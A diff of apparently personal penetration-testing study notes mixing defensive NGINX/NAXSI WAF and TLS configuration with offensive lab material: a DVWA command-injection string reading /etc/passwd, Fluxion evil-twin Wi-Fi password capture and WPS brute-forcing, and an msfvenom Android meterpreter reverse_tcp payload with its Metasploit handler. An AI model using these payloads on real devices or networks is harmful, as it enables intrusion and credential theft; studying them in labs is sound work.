@@ -1,21 +1,26 @@
 
-http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+#------------------------------------------------------------------------------
+# !!! Training
+#------------------------------------------------------------------------------
+# http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 
 
 #------------------------------------------------------------------------------
-# ! Shellcodes database for study cases
+# !!! Shellcodes database for study cases
 #------------------------------------------------------------------------------
 # http://shell-storm.org/shellcode/
 # list of scripts
 
 #------------------------------------------------------------------------------
 # Reverse Shell shell
-#------------------------------------------------------------------------------; nc -l -p 4444 127.0.0.1
-; https://github.com/rtaylor777/nasm/blob/master/RevShell1434.nasm
-; https://www.exploit-db.com/exploits/41398/
+#------------------------------------------------------------------------------
+nc -l -p 4444 127.0.0.1
 
-; For a detailed explanation of this shellcode see my blog post:
-; http://a41l4.blogspot.ca/2017/02/assignment-2b.html
+firefox https://github.com/rtaylor777/nasm/blob/master/RevShell1434.nasm
+forefox https://www.exploit-db.com/exploits/41398/
+
+#; For a detailed explanation of this shellcode see my blog post:
+firefox http://a41l4.blogspot.ca/2017/02/assignment-2b.html
 
 global _start
 section .text
@@ -79,46 +84,40 @@ http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
 # Exploit
 https://www.exploit-db.com/
 
+#* Network protocols, i.e. TCP/UDP
+#* Linux
+#* Virtual Machines
 
-* Network protocols, i.e. TCP/UDP
-* Linux
-* Virtual Machines
-
-* YouTube
-* SecurityTube
-* Twitter (follow people like egyp7, HD moore, dookie200ca, g0tmi1k, etc.)
-* VulnHub
-* EvilZone
-* IRC, Freenode in particular
-* Other hacker forums
-* And many more that I can't remember right now.
+#* YouTube
+#* SecurityTube
+#* Twitter (follow people like egyp7, HD moore, dookie200ca, g0tmi1k, etc.)
+#* VulnHub
+#* EvilZone
+#* IRC, Freenode in particular
+#* Other hacker forums
+#* And many more that I can't remember right now.
 
 #to learn
-* Web Applications
-* Web Services and APIs
-* Network/Routing Flaws
-* Service Misconfigurations (FTP, SSH, etc.)
-* Operating System Misconfigurations (Linux, Windows, etc.)
-* Buffer Overflows
-* XYZ Injection (Basically anything related to injecting arbitrary commands on a service level)
-* Cryptography Flaws
-* Physical Defects and Flaws
-* Malware/Spyware/Etc
-* And a lot more.
+#* Web Applications
+#* Web Services and APIs
+#* Network/Routing Flaws
+#* Service Misconfigurations (FTP, SSH, etc.)
+#* Operating System Misconfigurations (Linux, Windows, etc.)
+#* Buffer Overflows
+#* XYZ Injection (Basically anything related to injecting arbitrary commands \
+#    on a service level)
+#* Cryptography Flaws
+#* Physical Defects and Flaws
+#* Malware/Spyware/Etc
+#* And a lot more.
 
 
-
-
-
-
-exit
 #------------------------------------------------------------------------------
-#
+# NGINX NAXSI learning, whilesting
 #------------------------------------------------------------------------------
-
-Wallarm -> WAF with machine learning + vulnerability scanner
-Does a hybrit approach with filtering nodes installed in customer's infrasture and strong analytics in the cloud
-
+# Wallarm -> WAF with machine learning + vulnerability scanner
+# Does a hybrit approach with filtering nodes installed in customer's \
+#   infrasture and strong analytics in the cloud
 
 # NGINX directives to limit the buffers
 client_header_buffer_size
@@ -133,8 +132,8 @@ clien_body_timeout
 keepalive_timeout
 send_timeout
 
-
-# limit connections in NGINX, run benchmarks to see how many requests application can handle
+# NGINX: limit connections, run benchmarks to see how many requests \
+#   application can handle
 limit_conn and limit_req
 # www.fail2ban.org -> to ban people who tried to generate a lot of requests
 
@@ -144,16 +143,12 @@ limit_conn and limit_req
 # if it support JavaScript / Flash / cookies
 test_cookie -> to quickly understand it was products of a bot
 
-
 # What is perfect Ratio of Buffer & timeout
-
 location /search {
   return 444;
 }
 
-#
-# https://www.youtube.com/watch?v=LTq8LO9Het0
-#
+# firefox https://www.youtube.com/watch?v=LTq8LO9Het0
 #------------------------------------------------------------------------------
 # Naxsi goes from black users to white users
 # blacklist are negative by default in naxsi
@@ -161,67 +156,59 @@ location /search {
 
 MainRule "str:<" "msg open tag" "mz:Args|URL|BODY\$HEADERS_VAR:Cookie" "s:$XSS:8" "id:1302";
 
-As for a real FW, naxsi rules/whitelists should be as tight as possible:
+#As for a real FW, naxsi rules/whitelists should be as tight as possible:
   - $URL/footbar|$BODY_VAR:message
 
-Duty of administrator is to create whitelist to avoid false positive
-
-nxsi can runs script to tell this user from this ip will be not blocked
-
-Whitelist generation from logs or live traffic
-
-
+# Duty of administrator is to create whitelist to avoid false positive!!!
+# naxsi can runs script to tell this user from this ip will be not blocked
+# Whitelist generation from logs or live traffic
 # top 5000 sizes
-
-
-
 cat naxsi.rules
-"""
-SecRulesEnabled;
-DeniedUrl "50x.html"
+  "
+  SecRulesEnabled;
+  DeniedUrl "50x.html"
+  
+  CheckRule
+  "
 
-CheckRule
-"""
-
-
-
+#------------------------------------------------------------------------------
 # NGINX NAXSI
 # https://www.youtube.com/watch?v=JiJHCodn_PQ
 #------------------------------------------------------------------------------
-Rather than detecting << complex >> signatures, will focus on << tokens >>
+# Rather than detecting << complex >> signatures, will focus on << tokens >>
 -<>()[];='#...
 
-Tokens presence leads to score increase -> action
+# Tokens presence leads to score increase -> action
 
-Generated logs are pushed into ES - elastic search
-Data is relevant for monitoring and trafic inspection
-Nxapi with ES helps the admin generate whitelists
+# Generated logs are pushed into ES - elastic search
+# Data is relevant for monitoring and trafic inspection
+# Nxapi with ES helps the admin generate whitelists
 
-Beginning dump a lot of false positive
-if exaptions are not false positive learning is over
+# Beginning dump a lot of false positive
+# if exaptions are not false positive learning is over
 
 # Very low memory footprint
 # you don't need to update signatures
 # learning is getting better and better
 
-Detection rule - what you want to match into http traffic; score; id for whitelist
+# Detection rule - what you want to match into http traffic; score; id for whitelist
 
-CheckRule - one request is processed the request reach specific score, log  -> block or drop (sometimes during learning you want to drop it)
+# CheckRule - one request is processed the request reach specific score, log  -> block or drop (sometimes during learning you want to drop it)
 
-Whitelist -> common patert, 80% users make the same; this is false positive we want to whitelist, put them to db and tag them
+# Whitelist -> common patert, 80% users make the same; this is false positive we want to whitelist, put them to db and tag them
 
 
-Learning Fast -> nothing is blocked, but still you can drop with blocklist or libinjections
-blocking -> i set to true if i'm ok with learning
+# Learning Fast -> nothing is blocked, but still you can drop with blocklist or libinjections
+# blocking -> i set to true if i'm ok with learning
 
-Learning is the biggest downside, however
-- When it comes to << market >> apps,
-  whitelists are very predictable (tamplates!)
-- For home-made apps, several options:
-  - Relaying on statistics
-  - Relying on << trusted >> trafic
+# Learning is the biggest downside, however
+#- When it comes to << market >> apps,
+#  whitelists are very predictable (tamplates!)
+#- For home-made apps, several options:
+#  - Relaying on statistics
+#  - Relying on << trusted >> trafic
 
-More into learning
+# More into learning
 Nxtool templates (dynamic)
 {
   "_msg" : "Magento checkout page (BODY|NAME)",
@@ -255,7 +242,7 @@ reporting/visualisation
 Kybernete
 
 
-#Trips, naxsi language
+# Trips, naxsi language
 if ($remote_addr = "1.2.3.4"){
   set $naxsi_flag_learning 0;
   set $naxsi_libinjection_sql q;
@@ -275,24 +262,16 @@ CheckRule "$UWA >=8" DROP;
 # www.mare-system.de/doxi
 
 
-
-
-
-
-
-
-# NGINX https://www.youtube.com/watch?v=dsTub1_4Upg
 #------------------------------------------------------------------------------
-A lot of customization, we do hosting
-Web application, Classical IT
-
+# NGINX.conf https://www.youtube.com/watch?v=dsTub1_4Upg
+#------------------------------------------------------------------------------
+# A lot of customization, we do hosting
+# Web application, Classical IT
 
 Cipher Suites     # SSL used it
 
-
    ECDHE     -      RSA        -  AES256-GCM     - SHA384
 Key Exchange - Cerfificate Key - Trasport Cipher - Integrity
-
 
 # how to create a CSR and private key?
 # Certificate request
@@ -303,10 +282,8 @@ Key Exchange - Cerfificate Key - Trasport Cipher - Integrity
 openssl genrsa -out key.pem 2048
 openssl req -new -sha256 -key key.pem -out key.csr
 
-
 # Configuration NGINX
 Recommend at least 1.0.1p  (openssl )
-
 
 nginz.conf
 """
@@ -341,18 +318,14 @@ server {
   ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384
 
   ssl_prefer_server_ciphers on;     # server choice, always better
-
   # session tickets
-
   # HSTS
   add_header $strict-Transport-Security max-age=15768000;   # 6 months
-
   # OCSP Stampling: server pre-fetches OSCP responce -> make it faster
   # Saves a round-trip to the client
   set_stapling on;
   set_stapling_verify on;
   set_trusted_certificate /path/to/root_CA_cert_plus_intermediates;
-
 }
 
 server {
@@ -378,113 +351,167 @@ http {
 #
 """
 
-# To add HSTS !!! A+ security
-HSTS  Hyperprotect strick transport security; always redirect to https, but it's dangerous if ssl is down
-# HTTP header cached by browser
-# browser always attempts HTTPS
-# Maximum age defined in seconds
+# HSTS: To add HSTS !!! A+ security
+#   HSTS  Hyperprotect strick transport security; always redirect to https, \
+#   but it's dangerous if ssl is down
+#   HTTP header cached by browser
+#   browser always attempts HTTPS
+#   Maximum age defined in seconds
 
 
+#------------------------------------------------------------------------------
 # tools  jack tutorials
 #------------------------------------------------------------------------------
-Aircrack
-Airodump
-Bully
-Nmap
+aircrack
+
+# 
+# Running airodump-ng-oui-update as root is enough to keep aircrack-ng up to date.
+airodump
+
+# usage: bully <options> interface
+#    Required arguments:
+#      interface      : Wireless interface in monitor mode (root required)
+#      -b, --bssid macaddr    : MAC address of the target access point
+#   Or
+#      -e, --essid string     : Extended SSID for the access point
+#  Optional arguments:
+#
+#      -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
+#      -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
+#      -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
+#      -o, --outfile file     : Output file for messages          [stdout]
+#      -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
+#      -s, --source macaddr   : Source (hardware) MAC address      [Probe]
+#      -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]
+#      -w, --workdir path     : Location of pin/session files  [~/.bully/]
+#      -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
+#      -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
+#      -F, --force            : Force continue in spite of warnings   [No]
+#      -S, --sequential       : Sequential pins (do not randomize)    [No]
+#      -T, --test             : Test mode (do not inject any packets) [No]
+bully
+
+nmap
 
 
-#emove code Injection
+# !!! remove code Injection
 #------------------------------------------------------------------------------
-https://www.youtube.com/watch?v=AuNwk--lfxU#t=38.613354
+firefox https://www.youtube.com/watch?v=AuNwk--lfxU#t=38.613354
 
-http://www.dvwa.co.uk/
-DVWA tutorial/security
-command injection or remote code executing
+#------------------------------------------------------------------------------
+# DVWA - <install|run|README>
+#------------------------------------------------------------------------------
+#
+# FIRST METHOD OF INSTALLATION
+#------------------------------------------------------------------------------
 
-
-Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.
-
-sudo apt-get install mysql-server
-sudo apt-get install unzip apache2 php5 php5-mysql php-pear
-cd /var/www/html
-wget https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip
-rm v1.0.8.zip
-mv DVWA-1.0.8 dvwa
-vim dvwa/config/config.inc.php
-"""
-$_DVWA[ 'db_password' ] = 'p@ssw0rd';
-
-and replace “p@ssw0rd” with your MySQL password.
-"""
-
-cd
-vim /etc/php5/apache2/php.ini
-"""
-allow_url_include = Off
-
-and replace “Off” with “On”
-"""
-chmod -R 777 /var/www/html/dvwa
-mysql -u root -p
-create database dcwa;
-exit
-
-vim /etc/apache2/apache2.conf
-"""
-Move to the bottom of the file and add the following line:
-
-ServerName localhost
-"""
-
-service apache2 start
-
-http://192.168.0.171/dvwa/setup.php
-
-Create Reset Database
-
-http://192.168.0.20/dvwa/
-
-and log in with the following credentials:
-
-username: admin
-
-password: password
-
-https://linuxsecurityblog.com/2016/01/28/install-dvwa-on-ubuntu/
-
-
-!!!!!!!
 XAMPP can be downloaded from: https://www.apachefriends.org/en/xampp.html
+wget https://www.apachefriends.org/xampp-files/5.6.30/xampp-linux-x64-5.6.30-0-installer.run
+
 Simply unzip dvwa.zip, place the unzipped files in your public html folder, then point your browser to: http://127.0.0.1/dvwa/setup.php
-!!!!!!
-
-Ping device
-ping-c 4 192.168.0.171
 
 
+ping 192.168.0.171 -c 1
 
 DvWA > Command injection > 191.168.0.171; cat /etc/passwd
 
-# wifi
+# SECOND METHOD OF INSTALLATION
 #------------------------------------------------------------------------------
-https://www.youtube.com/watch?v=Pc8JCiRZ-4w
+#   firefox http://www.dvwa.co.uk/
+#   firefox https://linuxsecurityblog.com/2016/01/28/install-dvwa-on-ubuntu/
+#
+# !!! DVWA tutorial/security
+# command injection or remote code executing
+# Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn \
+#   vulnerable. Its main goals are to be an aid for security professionals \
+#   to test their skills and tools in a legal environment, \
+#   help web developers better understand the processes of securing \
+#   web applications and aid teachers/students to teach/learn web application \
+#   security in a class room environment.
+
+function DVWA-adjustConfig() {
+  vim dvwa/config/config.inc.php
+  "
+  $_DVWA[ 'db_password' ] = 'p@ssw0rd';
+  and replace “p@ssw0rd” with your MySQL password.
+  "
+}
+cd
+
+function DVWA-adjustPHPini() {
+  vim /etc/php5/apache2/php.ini
+  "
+  allow_url_include = Off
+
+  and replace “Off” with “On”
+  "
+}
+
+function DVWA-utils() {
+  chmod -R 777 /var/www/html/dvwa
+  mysql -u root -p
+  create database dcwa;
+  exit
+}
+
+function DVWA-adjustAPACHE2conf() {
+  vim /etc/apache2/apache2.conf
+  "
+  Move to the bottom of the file and add the following line:
+  
+  ServerName localhost
+  "
+  service apache2 start
+}
+
+function DVWA-testFirefox() {
+  firefox http://192.168.0.171/dvwa/setup.php &
+
+  echo -e "\tINFO: Create Reset Database  firefox http://192.168.0.20/dvwa/ "
+  echo -e "\tINFO: username: admin"
+  echo -e "\tINFO: password: password"
+  echo -e "\t sleeps for 3 seconds..."
+  time 3
+  firefox http://192.168.0.20/dvwa/ &
+}
+
+function DVWA-install() {
+  sudo apt-get install mysql-server
+  sudo apt-get install unzip apache2 php5 php5-mysql php-pear
+  cd /var/www/html
+  wget https://github.com/RandomStorm/DVWA/archive/v1.0.8.zip
+  rm v1.0.8.zip
+  mv DVWA-1.0.8 dvwa
+
+  DVWA-adjustConfig
+  DVWA-adjustPHPini
+  DVWA-utils
+  DVWA-adjustAPACHE2conf
+  DVWA-testFirefox
+}
+
+
+#------------------------------------------------------------------------------
+# WIFI
+#------------------------------------------------------------------------------
+firefox https://www.youtube.com/watch?v=Pc8JCiRZ-4w
 # man in the middle
 
 FLuxion -> Flusion is a remake of linset by vk496 with less bugs and more features. It's compatible with Kali
 
-Rowsberri Pie
+# Rowsberri Pie
 
-Scan the networks
-Capture a handshake  - capture a handshake automaticaly
-Use WEB Inter
-Launch a FakeAP   -> imitate access point
-Spawns a MDK3 process  -> deauthenticate all Users
-A fake DNS
-A captive portal
-Each submitted password is verified
+# Scan the networks
+# Capture a handshake  - capture a handshake automaticaly
+# Use WEB Inter
+# Launch a FakeAP   -> imitate access point
+# Spawns a MDK3 process  -> deauthenticate all Users
+# A fake DNS
+# A captive portal
+# Each submitted password is verified
 
 
-copy the script from Flusion git
+# copy the script from Flusion git
 # you need two wireless cards and at list one package ingestion
 
 cd .ssh
@@ -492,12 +519,14 @@ Host rudik
   Hostname 192.168.1.171
   User root
 
-sudo apt-get install git
-git clone https://github.com/deltaxflux/fluxion.git
+function installFluxion() {
+  $APP_NAME=fluxion
+  mkdir -p $HOME/$APP_NAME && cd $HOME/$APP_NAME
+  git clone https://github.com/deltaxflux/fluxion.git
+  cd fluxion
+  ./Installer.sh
+}
 ls
-cd fluxion
-ls
-./Installer.sh
 # inside graphical session
 sudo apt-get install tightvncserver
 tightvncserver
@@ -562,29 +591,25 @@ Press ENTER to skip
 Path: /root/handshakes/<name>.cap
 
 
-
-
-
-
-
-
-
-
+#------------------------------------------------------------------------------
 # GO THERE the bit security organization with Tesla, , check tutorial
 #------------------------------------------------------------------------------
 bugcrowd
 
-# android
 #------------------------------------------------------------------------------
-https://www.youtube.com/watch?v=hDsdpbAWrKA
-
+# Android
+#------------------------------------------------------------------------------
+# firefox https://www.youtube.com/watch?v=hDsdpbAWrKA
 # on the same network phone and kali
 # pay load
-# LHOST is my ip from ifconfig; this will send to user
+# 1. CREATE pay load; LHOST is my ip from ifconfig; this will send to user;
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=4444 R >shell.apk
 
-get the file on android
+# 2. get the file on android
 
+# 3. Connect
+#    easy phishing: Set up email templates, landing pages and listeners
+#    in Metasploit Pro -- learn more on http://rapid7.com/metasploit
 msfconsole
 msf > use exploit/multi/handler
 > set payload android/meterpreter/reverse_tcp
@@ -593,6 +618,7 @@ msf > use exploit/multi/handler
 > exploit
 >> this will start lisening
 
+# 4. Use
 meterpreter > help
 > check_root
 > ls
@@ -606,63 +632,58 @@ meterpreter > help
 > exit
 
 
-
 service apache2 start
 
+#------------------------------------------------------------------------------
 # nmap network mapper
 #------------------------------------------------------------------------------
-https://n0where.net/security-auditing-tool-lynis/
+firefox https://n0where.net/security-auditing-tool-lynis/
 ifconfig
 
 # list of host on the x.x.x.<0-255>
 nmap -sP 10.0.0.0/24
+nmap -sS -A 192.168.0.0/24
+# Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-17 21:11 CEST
+# Nmap scan report for 192.168.0.171
+# Host is up (0.000032s latency).
+# Not shown: 998 closed ports
+# PORT     STATE SERVICE    VERSION
+# 80/tcp   open  http       nginx 1.10.0 (Ubuntu)
+# |_http-server-header: nginx/1.10.0 (Ubuntu)
+# |_http-title: Welcome to nginx!
+# 3128/tcp open  http-proxy Squid http proxy 3.5.12
+# |_http-server-header: squid/3.5.12
+# |_http-title: ERROR: The requested URL could not be retrieved
+# Device type: general purpose
+# Running: Linux 3.X
+# OS CPE: cpe:/o:linux:linux_kernel:3
+# OS details: Linux 3.12 - 3.19, Linux 3.8 - 3.19
+# Network Distance: 0 hops
+# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
 
-kuntuzangmo@kuntuzangpo:~$ sudo nmap -sS -A 192.168.0.171
+#------------------------------------------------------------------------------
+# ametist   - analytic tool
+#------------------------------------------------------------------------------
 
-Starting Nmap 7.01 ( https://nmap.org ) at 2016-10-17 21:11 CEST
-Nmap scan report for 192.168.0.171
-Host is up (0.000032s latency).
-Not shown: 998 closed ports
-PORT     STATE SERVICE    VERSION
-80/tcp   open  http       nginx 1.10.0 (Ubuntu)
-|_http-server-header: nginx/1.10.0 (Ubuntu)
-|_http-title: Welcome to nginx!
-3128/tcp open  http-proxy Squid http proxy 3.5.12
-|_http-server-header: squid/3.5.12
-|_http-title: ERROR: The requested URL could not be retrieved
-Device type: general purpose
-Running: Linux 3.X
-OS CPE: cpe:/o:linux:linux_kernel:3
-OS details: Linux 3.12 - 3.19, Linux 3.8 - 3.19
-Network Distance: 0 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
-
-
-ametist
-
+#------------------------------------------------------------------------------
 # NGINX NASXI
 #------------------------------------------------------------------------------
-https://github.com/nbs-system/naxsi/wiki/naxsi-setup
-
-
-
-
+# https://github.com/nbs-system/naxsi/wiki/naxsi-setup
 # hodnoceni
-https://n0where.net/nginx-web-application-firewall-naxsi/
+# https://n0where.net/nginx-web-application-firewall-naxsi/
 
 
 # Security
 #------------------------------------------------------------------------------
 # Kali security hodnoceni
-https://n0where.net/security-auditing-tool-lynis/
-
-Kali Linux ? Vulnerability Analysis > Misc Scanners > Lynis
+# https://n0where.net/security-auditing-tool-lynis/
+# Kali Linux ? Vulnerability Analysis > Misc Scanners > Lynis
 
 lynis --check-all --no-log --quick
 
+#------------------------------------------------------------------------------
 #  SSH
 #------------------------------------------------------------------------------
 # open ports
@@ -672,9 +693,6 @@ ssh <user>@<hostname> '/etc/init.d/mysql restart'
 # get from server and store locali
 ssh <user>@<hostname> 'cp ~/apache/sites/*/conf/worker.workers' > ~/tmp/apache/sites/conf
 
-#  Citrix
-#------------------------------------------------------------------------------
-https://portal.comproof.net/vpn/index.html
 
 # KILL Citrix
 /opt/Citrix/ICAClient/wfica -icaroot /opt/Citrix/ICAClient /tmp/mozilla_kuntuzangmo0/Q2xhcmEuUmVtb3RlIERlc2t0b3A-.ica
@@ -683,7 +701,4 @@ https://portal.comproof.net/vpn/index.html
 # WIFI Start wlp2s0
 #------------------------------------------------------------------------------
 /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-wlp2s0.pid -lf /var/lib/Net
-
-
-
 
